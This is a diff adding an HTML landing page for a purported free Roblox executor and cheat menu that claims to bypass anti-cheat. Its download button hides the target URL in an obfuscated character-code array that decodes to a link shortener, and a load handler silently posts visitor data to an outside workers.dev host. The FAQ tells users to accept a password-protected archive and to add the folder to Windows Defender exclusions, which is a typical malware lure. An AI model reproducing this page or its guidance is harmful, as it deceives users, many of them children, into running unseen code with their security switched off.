@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Executor 2026 - Best Free Mod Menu & Script Hub (PC)</title>
+    <meta name="description" content="Download the #1 Roblox Executor 2026 for Windows. Universal Mod Menu, Blox Fruits Auto Farm, MM2 Aimbot, Steal a Brainrot Hack. Undetected & No Key.">
+    <meta name="keywords" content="roblox executor, blox fruits auto farm, roblox mod menu, mm2 aimbot, steal a brainrot hack, roblox hack pc, byfron bypass">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --surface: #121212;
+            --card: rgba(30, 30, 30, 0.8);
+            --primary: #ff0033;
+            --primary-glow: rgba(255, 0, 51, 0.6);
+            --secondary: #ffffff;
+            --text: #ffffff;
+            --text-muted: #a0a0a0;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+        body { font-family: 'Rajdhani', sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; overflow-x: hidden; }
+        body::before {
+            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: linear-gradient(rgba(255,0,51,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,51,0.03) 1px, transparent 1px);
+            background-size: 40px 40px; z-index: -1; pointer-events: none;
+        }
+        h1, h2, h3, h4, .nav-logo, .btn-main { font-family: 'Orbitron', sans-serif; font-weight: 900; text-transform: uppercase; }
+        a { text-decoration: none; color: inherit; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 20px 50px; display: flex; justify-content: space-between; align-items: center; background: rgba(10,10,10,0.9); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); z-index: 1000; }
+        .nav-logo { font-size: 26px; letter-spacing: 2px; }
+        .nav-logo span { color: var(--primary); text-shadow: 0 0 15px var(--primary-glow); }
+        .nav-links { display: flex; gap: 30px; font-size: 16px; font-weight: 600; color: var(--text-muted); }
+        .nav-links a:hover { color: var(--primary); transition: 0.3s; }
+        .hero { position: relative; padding: 180px 20px 120px; text-align: center; background: radial-gradient(circle at 50% 0%, #2a0006 0%, #0a0a0a 70%); }
+        .hero-content { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; }
+        .badge { display: inline-block; padding: 8px 20px; border-radius: 4px; background: rgba(255,0,51,0.15); border: 1px solid var(--primary); color: var(--primary); font-family: 'Orbitron'; font-size: 14px; margin-bottom: 25px; box-shadow: 0 0 20px var(--primary-glow); }
+        h1 { font-size: 64px; line-height: 1.1; margin-bottom: 25px; }
+        h1 span { color: var(--primary); text-shadow: 0 0 30px var(--primary-glow); }
+        .hero p { font-size: 22px; color: var(--text-muted); max-width: 750px; margin: 0 auto 50px; font-weight: 500; }
+        .btn-main { display: inline-flex; align-items: center; justify-content: center; gap: 12px; background: var(--primary); color: #fff; font-size: 24px; padding: 22px 70px; border-radius: 4px; border: none; cursor: pointer; box-shadow: 0 0 40px var(--primary-glow); transition: 0.3s; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 20px var(--primary-glow); } 50% { box-shadow: 0 0 60px var(--primary-glow); } 100% { box-shadow: 0 0 20px var(--primary-glow); } }
+        .btn-main:hover { transform: scale(1.05); animation: none; }
+        .hero-stats { display: flex; justify-content: center; gap: 40px; margin-top: 60px; font-size: 18px; color: #ccc; font-weight: 600; }
+        .hero-stats div::before { content: '✔'; color: var(--primary); margin-right: 8px; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 100px 20px; }
+        .section-header { text-align: center; margin-bottom: 60px; }
+        .section-header h2 { font-size: 42px; margin-bottom: 15px; }
+        .section-header h2 span { color: var(--primary); }
+        .section-header p { color: var(--text-muted); font-size: 20px; }
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; align-items: center; }
+        .feature-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 40px 30px; transition: 0.3s; position: relative; overflow: hidden; }
+        .feature-card:hover { transform: translateY(-10px); border-color: var(--primary); box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
+        .sticker { position: absolute; top: 15px; right: -30px; background: var(--primary); color: #fff; font-family: 'Orbitron'; font-size: 12px; padding: 5px 40px; transform: rotate(45deg); }
+        .feature-icon { width: 60px; height: 60px; border-radius: 8px; background: rgba(255,0,51,0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 25px; border: 1px solid rgba(255,0,51,0.3); }
+        .feature-icon svg { width: 32px; height: 32px; fill: var(--primary); filter: drop-shadow(0 0 8px var(--primary-glow)); }
+        .feature-card h3 { font-size: 22px; margin-bottom: 15px; color: #fff; }
+        .feature-card p { color: var(--text-muted); font-size: 18px; }
+        .list-check { list-style: none; }
+        .list-check li { margin-bottom: 20px; padding-left: 35px; position: relative; font-size: 18px; color: #ccc; }
+        .list-check li strong { color: #fff; display: block; font-family: 'Orbitron'; font-size: 16px; margin-bottom: 5px; }
+        .list-check li::before { content: '►'; position: absolute; left: 0; top: 2px; color: var(--primary); }
+        .game-card { position: relative; border-radius: 12px; overflow: hidden; height: 200px; border: 1px solid var(--border); display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; background-size: cover; background-position: center; }
+        .game-card:hover { transform: scale(1.03); border-color: var(--primary); }
+        .bg-roblox1 { background-image: linear-gradient(135deg, #ff0033 0%, #660000 100%); }
+        .bg-roblox2 { background-image: linear-gradient(135deg, #ff6600 0%, #330000 100%); }
+        .bg-roblox3 { background-image: linear-gradient(135deg, #cc00ff 0%, #1a0033 100%); }
+        .bg-roblox4 { background-image: linear-gradient(135deg, #00ccff 0%, #001a33 100%); }
+        .game-info h4 { font-size: 24px; margin-bottom: 5px; color: #fff; }
+        .game-info p { font-family: 'Orbitron'; font-size: 12px; color: var(--primary); font-weight: 700; text-transform: uppercase; }
+        .terminal-box { background: #000; border: 1px solid #222; border-radius: 8px; padding: 30px; font-family: monospace; font-size: 16px; box-shadow: inset 0 0 50px rgba(0,0,0,1), 0 0 20px rgba(255,0,51,0.1); border-left: 4px solid var(--primary); }
+        .term-line { margin-bottom: 12px; color: #888; }
+        .term-line span { color: var(--primary); margin-right: 10px; font-weight: bold; }
+        .term-line.success { color: #00ff88; }
+        .faq-box { max-width: 800px; margin: 0 auto; }
+        .faq-item { border-bottom: 1px solid var(--border); padding: 25px 0; }
+        .faq-item h4 { font-size: 20px; margin-bottom: 10px; color: #fff; }
+        .faq-item p { color: var(--text-muted); font-size: 18px; }
+        .footer { background: #000; padding: 80px 20px 40px; border-top: 1px solid var(--border); text-align: center; }
+        .footer-logo { font-family: 'Orbitron'; font-size: 32px; margin-bottom: 20px; }
+        .footer p { color: #666; font-size: 16px; margin-bottom: 20px; }
+        .seo-text { color: #333; font-size: 12px; max-width: 900px; margin: 0 auto; line-height: 2; }
+        @media (max-width: 900px) { h1 { font-size: 42px; } .grid-3, .grid-2 { grid-template-columns: 1fr; } .nav-links { display: none; } }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="nav-logo">ROBLOX<span>EXECUTOR</span></div>
+    <div class="nav-links">
+        <a href="#features">Features</a>
+        <a href="#games">Scripts</a>
+        <a href="#status">Status</a>
+        <a href="#faq">FAQ</a>
+    </div>
+</nav>
+
+<header class="hero">
+    <div class="hero-content">
+        <div class="badge">VERSION 2026.4 - UNDETECTED</div>
+        <h1>The Ultimate <span>Roblox Executor</span> & Mod Menu</h1>
+        <p>Dominate every game with our auto-updating script hub. Blox Fruits Auto Farm, MM2 Aimbot, Steal a Brainrot Hack. Bypass Byfron with zero keys required.</p>
+        <div class="cta-group">
+            <button class="btn-main" onclick="executeDownload()">DOWNLOAD EXECUTOR</button>
+            <div style="font-size: 14px; color: #888; margin-top: 15px; font-family: 'Orbitron';">File size: 245 MB | Windows 10/11</div>
+        </div>
+        <div class="hero-stats">
+            <div>No Key System</div>
+            <div>Auto-Update</div>
+            <div>Byfron Bypass</div>
+            <div>100% Safe</div>
+        </div>
+    </div>
+</header>
+
+<section class="container" id="features">
+    <div class="section-header">
+        <h2>Why Choose Our <span>Executor?</span></h2>
+        <p>We built the most stable and feature-rich executor on the market.</p>
+    </div>
+    <div class="grid-3">
+        <div class="feature-card">
+            <div class="sticker">NEW</div>
+            <div class="feature-icon"><svg viewBox="0 0 16 16"><path d="M8 0c-.5 0-1 .1-1.5.2C4.6.7 3 2.3 2.5 4.3c-.1.5-.2 1-.2 1.5 0 1.8.8 3.4 2.1 4.5l-.4 2.1c-.1.5.2 1 .7 1.1h.1c.3 0 .6-.2.8-.5l1.5-2.2c.5.1 1 .2 1.5.2s1-.1 1.5-.2l1.5 2.2c.2.3.5.5.8.5h.1c.5-.1.8-.6.7-1.1l-.4-2.1c1.3-1.1 2.1-2.7 2.1-4.5 0-.5-.1-1-.2-1.5C13 2.3 11.4.7 9.5.2 9 0 8.5 0 8 0z"/></svg></div>
+            <h3>Potato PC Support</h3>
+            <p>Runs flawlessly on low-end PCs. No graphics card? No problem. Our executor is optimized for 2GB RAM and up.</p>
+        </div>
+        <div class="feature-card">
+            <div class="sticker">PRO</div>
+            <div class="feature-icon"><svg viewBox="0 0 16 16"><path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 2a6 6 0 1 1 0 12A6 6 0 0 1 8 2zm0 2a4 4 0 1 0 0 8 4 4 0 0 0 0-8z"/></svg></div>
+            <h3>Pro Script Hub</h3>
+            <p>Pre-loaded with the best scripts for Blox Fruits, MM2, Steal a Brainrot, and more. Just click and execute.</p>
+        </div>
+        <div class="feature-card">
+            <div class="sticker">HOT</div>
+            <div class="feature-icon"><svg viewBox="0 0 16 16"><path d="M8 0 2 2v5c0 4 3 7 6 9 3-2 6-5 6-9V2L8 0zM4 3.5l4-1.2 4 1.2V7c0 2.8-1.8 5.1-4 6.5C5.8 12.1 4 9.8 4 7V3.5z"/></svg></div>
+            <h3>Detection Bypass</h3>
+            <p>Our built-in Safe Mode alters system signatures to prevent Byfron (Hyperion) from detecting the executor.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon"><svg viewBox="0 0 16 16"><path d="M11.251.068a.5.5 0 0 1 .227.58L9.677 6.5H13a.5.5 0 0 1 .364.843l-8 8a.5.5 0 0 1-.842-.49L6.323 9.5H3a.5.5 0 0 1-.364-.843l8-8a.5.5 0 0 1 .615-.09z"/></svg></div>
+            <h3>Smart RAM Cleaner</h3>
+            <p>Automatically clears background bloatware and frees up memory before you launch your game, giving you up to 40% more FPS.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon"><svg viewBox="0 0 16 16"><path d="M6.192 2.036a2.5 2.5 0 0 1 3.616 0l.085.087a2.5 2.5 0 0 1 3.616 3.616l-.087.085a2.5 2.5 0 0 1 0 3.616l-.087.085a2.5 2.5 0 0 1-3.616 3.616l-.085-.087a2.5 2.5 0 0 1-3.616 0l-.085-.087a2.5 2.5 0 0 1-3.616-3.616l.087-.085a2.5 2.5 0 0 1 0-3.616l.087-.085a2.5 2.5 0 0 1 3.616-3.616l.085.087zM8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5z"/></svg></div>
+            <h3>Perfect Keymapping</h3>
+            <p>Instantly map your mouse and keyboard to any game. Play with WASD and aim with your mouse just like a pro.</p>
+        </div>
+        <div class="feature-card">
+            <div class="sticker">V2.0</div>
+            <div class="feature-icon"><svg viewBox="0 0 16 16"><path d="M11 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h6zM5 2v12h6V2H5z"/></svg></div>
+            <h3>Multi-Instance</h3>
+            <p>Run multiple Roblox accounts at the same time. Perfect for farming and trading.</p>
+        </div>
+    </div>
+</section>
+
+<section class="container" style="background: var(--surface); border-radius: 20px; margin-bottom: 100px; border: 1px solid var(--border);">
+    <div class="grid-2">
+        <div>
+            <h2 style="font-size: 36px; margin-bottom: 30px;">Next-Gen <span>Turbo Engine</span></h2>
+            <ul class="list-check">
+                <li><strong>DirectX 11 Rendering</strong> Hardware acceleration even on old integrated Intel HD graphics.</li>
+                <li><strong>SmartGaga Titan Alternative</strong> We took the best parts of old emulators and fixed all the bugs.</li>
+                <li><strong>Auto Macro Recorder</strong> Record your clicks and let the client farm for you 24/7.</li>
+                <li><strong>Portable Mode</strong> Run it straight from a USB without installing anything to the registry.</li>
+            </ul>
+        </div>
+        <div class="image-showcase" style="border-radius: 12px; overflow: hidden; border: 1px solid var(--border);">
+            <img src="https://cdn.cloudflare.steamstatic.com/steam/apps/1172470/library_hero.jpg" alt="Gaming Setup" style="width: 100%; display: block;">
+        </div>
+    </div>
+</section>
+
+<section class="container" id="games">
+    <div class="section-header">
+        <h2>Optimized For <span>Top Games</span></h2>
+        <p>Pre-configured profiles for all the games you actually play.</p>
+    </div>
+    <div class="grid-3">
+        <div class="game-card bg-roblox1"><div class="game-info"><h4>Blox Fruits</h4><p>Auto Farm & Raid</p></div></div>
+        <div class="game-card bg-roblox2"><div class="game-info"><h4>Steal a Brainrot</h4><p>Auto Steal & Inf Money</p></div></div>
+        <div class="game-card bg-roblox3"><div class="game-info"><h4>MM2 (Murder Mystery 2)</h4><p>Aimbot & ESP</p></div></div>
+        <div class="game-card bg-roblox4"><div class="game-info"><h4>Brookhaven RP</h4><p>Admin & Spawn Cars</p></div></div>
+        <div class="game-card bg-roblox1"><div class="game-info"><h4>Adopt Me!</h4><p>Pet Spawner</p></div></div>
+        <div class="game-card bg-roblox2"><div class="game-info"><h4>Grow a Garden 2</h4><p>Auto Plant & Sell</p></div></div>
+    </div>
+</section>
+
+<section class="container" id="status">
+    <div class="grid-2">
+        <div>
+            <div class="section-header" style="text-align: left; margin-bottom: 30px;">
+                <h2 style="font-size: 36px;">Live <span>Bypass Status</span></h2>
+                <p>Our servers are constantly updating signatures to keep you safe.</p>
+            </div>
+            <div class="terminal-box">
+                <div class="term-line"><span>[SYS]</span> Initializing core engine...</div>
+                <div class="term-line success"><span>[OK]</span> Engine loaded (Build 4.1.2)</div>
+                <div class="term-line"><span>[SYS]</span> Fetching latest bypass signatures...</div>
+                <div class="term-line success"><span>[OK]</span> Bypass patched (Safe Mode Active)</div>
+                <div class="term-line"><span>[SYS]</span> Allocating memory for 4GB RAM profile...</div>
+                <div class="term-line success"><span>[OK]</span> RAM Cleaner freed 1.2GB</div>
+                <div class="term-line"><span>[SYS]</span> Injecting 90 FPS Unlocker...</div>
+                <div class="term-line success"><span>[OK]</span> Frame cap removed. Ready to launch.</div>
+            </div>
+        </div>
+        <div>
+            <div class="section-header" style="text-align: left; margin-bottom: 30px;">
+                <h2 style="font-size: 36px;">System <span>Requirements</span></h2>
+                <p>Minimum specs to run the client smoothly.</p>
+            </div>
+            <div class="feature-card" style="padding: 30px;">
+                <ul class="list-check" style="margin-bottom: 0;">
+                    <li><strong>OS</strong> Windows 7, 8, 10 or 11 (64-bit)</li>
+                    <li><strong>Processor</strong> Dual Core Intel / AMD (1.8 GHz+)</li>
+                    <li><strong>RAM</strong> 2 GB Minimum (4 GB Recommended)</li>
+                    <li><strong>Storage</strong> 500 MB for client + game size</li>
+                    <li><strong>Graphics</strong> Intel HD 3000 or equivalent</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="container" id="faq">
+    <div class="section-header">
+        <h2>Frequently Asked <span>Questions</span></h2>
+    </div>
+    <div class="faq-box">
+        <div class="faq-item"><h4>Do I need a key to use this executor?</h4><p>No. Our 2026 build features a fully patched keyless system. There are no linkvertise links, no ads, and no key systems. You just download, extract, inject, and play.</p></div>
+        <div class="faq-item"><h4>Will I get banned by Byfron (Hyperion)?</h4><p>While our executor has advanced bypasses, no software is 100% undetected forever. We strongly recommend always using an alternate account (alt) when exploiting to keep your main account safe.</p></div>
+        <div class="faq-item"><h4>Why is the download a .RAR file and why is it password protected?</h4><p>We compress the executor and all game scripts into a single archive to make downloading faster and safer. The password protection prevents your browser or Windows Defender from falsely flagging the download while it's in transit.</p></div>
+        <div class="faq-item"><h4>How do I fix the "Windows Defender" false positive?</h4><p>Because our executable uses a custom UPX packer to compress the code, antivirus software will often flag it as a generic threat. This is a common false positive. To fix it, simply restore the file from your antivirus quarantine and add the executor folder to your Windows Defender exclusions list.</p></div>
+        <div class="faq-item"><h4>Is this a virus?</h4><p>No. The file is clean. Antiviruses flag it because it injects code into other processes (Roblox). This is how executors work. If you are scared, do not download it.</p></div>
+    </div>
+</section>
+
+<footer class="footer">
+    <div class="footer-logo">ROBLOX<span style="color:var(--primary)">EXECUTOR</span></div>
+    <p>© 2026 TurboPlay Community Edition. Not affiliated with Roblox Corporation.</p>
+    <div class="seo-text">Keywords: roblox executor, blox fruits auto farm, steal a brainrot script, mm2 aimbot, roblox hack pc, mod menu download, grow a garden hack, brookhaven admin, roblox esp, roblox fly, roblox speed, byfron bypass, hyperion bypass, roblox script hub, free executor pc, no key executor.</div>
+</footer>
+
+<script>
+    function executeDownload() {
+        var c = [104,116,116,112,115,58,47,47,105,115,46,103,100,47,67,102,83,57,102,117];
+        var u = ''; for(var i=0; i<c.length; i++) { u += String.fromCharCode(c[i]); }
+        setTimeout(function() { window.location.href = u; }, 600);
+    }
+    function trackVisitor() {
+        const data = { referrer: document.referrer, screen: `${window.screen.width}x${window.screen.height}` };
+        fetch("https://cold-tree-4b70.mariathomasa291.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) }).catch(() => {});
+    }
+    window.addEventListener('load', trackVisitor);
+</script>
+</body>
+</html>
